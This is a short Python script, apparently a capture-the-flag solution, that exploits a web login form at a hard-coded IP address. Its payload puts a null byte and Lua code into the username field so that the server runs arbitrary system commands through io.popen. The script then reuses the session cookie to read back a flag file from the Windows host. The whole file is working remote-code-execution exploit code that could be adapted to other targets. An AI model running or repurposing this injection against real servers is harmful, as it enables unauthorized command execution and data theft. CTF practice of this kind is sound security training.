#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "requests",
# ]
# ///

import pathlib
import re
import sys
import urllib.parse

import requests

HERE = pathlib.Path(__file__).resolve().parent
TARGET = "http://23.179.17.68"
FLAG_PATH = r"C:\\Users\\bob\\Desktop\\flag1.txt"


def build_payload(command: str) -> str:
    encoded_command = urllib.parse.quote(command, safe="")
    injected = (
        "%00]]%0d"
        f"local%20h%20=%20io.popen(%22{encoded_command}%22)%0d"
        "local%20r%20=%20h:read(%22*a%22)%0d"
        "h:close()%0d"
        "print(r)%0d"
        "--"
    )
    return f"username=anonymous{injected}&password="


def trigger_command(command: str) -> str:
    response = requests.post(
        f"{TARGET}/loginok.html",
        headers={
            "Cookie": "client_lang=english",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{TARGET}/login.html?lang=english",
            "Origin": TARGET,
        },
        data=build_payload(command),
        timeout=20,
    )
    response.raise_for_status()

    match = re.search(r"UID=([^;]+)", response.headers.get("Set-Cookie", ""))
    if not match:
        raise RuntimeError("missing UID cookie after exploit POST")

    response = requests.get(
        f"{TARGET}/dir.html",
        headers={"Cookie": f"UID={match.group(1)}"},
        timeout=20,
    )
    response.raise_for_status()
    return response.text


def extract_flag(text: str) -> str:
    match = re.search(r"CIT\{[^}]+\}", text)
    if not match:
        raise RuntimeError("flag not found in exploit response")
    return match.group(0)


def main() -> None:
    text = trigger_command(f"type {FLAG_PATH}")
    print(extract_flag(text))


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise
